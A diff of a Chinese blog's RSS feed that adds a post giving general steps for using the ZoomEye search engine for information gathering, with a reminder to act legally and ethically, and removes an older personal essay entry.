+登录账户： 使用您的凭据登录到 ZoomEye 账户。
+
+执行搜索： 在 ZoomEye 的搜索栏中，您可以输入搜索查询，可以是关键词、IP 地址、域名、特定的端口等。您还可以使用高级搜索运算符来精确指定搜索条件。
+
+分析搜索结果： ZoomEye 根据您的搜索条件返回相应的结果。您可以查看每个结果的详细信息，包括设备类型、IP 地址、端口、漏洞信息等。
+
+导出数据： 如果您希望将搜索结果保存或进行进一步分析，您可以选择将结果导出为 CSV 文件或 JSON 格式。
+
+使用 API（可选）： ZoomEye 提供了 API 接口，您可以在自己的应用程序中访问 ZoomEye 数据。使用 API 需要一些编程知识。
+
+高级功能（高级用户）： 高级用户可以订阅 ZoomEye 的高级服务，获取更多功能，如更大的搜索配额、数据历史记录等。
+
+请注意，虽然 ZoomEye 可以为安全专业人员提供有价值的信息，但在使用 ZoomEye 时，务必遵守适用的法律和道德准则。未经授权地访问、操纵或利用他人的设备、系统或信息是违法行为。使用 ZoomEye 时，请始终确保您的活动是合法和道德的。
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;br /&gt;
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+&lt;br /&gt; 
+转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2022/10/H系列-信息收集_搜索引擎/&quot;&gt; H系列 - 信息收集_搜索引擎 &lt;/a&gt;&lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/images/posts/20220715/1.jpeg&quot; alt=&quot;&quot; width=&quot;80%&quot; height=&quot;80%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;
-&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;转载请注明：&lt;a href=&quot;http://yuqianglianshou.com&quot;&gt;劉清揚的博客&lt;/a&gt; » &lt;a href=&quot;http://yuqianglianshou.com/2022/07/我为什么要努力/&quot;&gt; 我,为什么要努力? &lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
 </description>
-      <pubDate>Fri, 15 Jul 2022 00:00:00 +0800</pubDate>
-      <link>http://localhost:4000/2022/07/%E6%88%91%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%8A%AA%E5%8A%9B/</link>
-      <guid isPermaLink="true">http://localhost:4000/2022/07/%E6%88%91%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E5%8A%AA%E5%8A%9B/</guid>
+      <pubDate>Tue, 18 Oct 2022 00:00:00 +0800</pubDate>
+      <link>http://localhost:4000/2022/10/H%E7%B3%BB%E5%88%97-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86_%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/</link>
+      <guid isPermaLink="true">http://localhost:4000/2022/10/H%E7%B3%BB%E5%88%97-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86_%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/</guid>
         
-      <category>人生</category>
+      <category>H系列</category>
         
         
     </item>
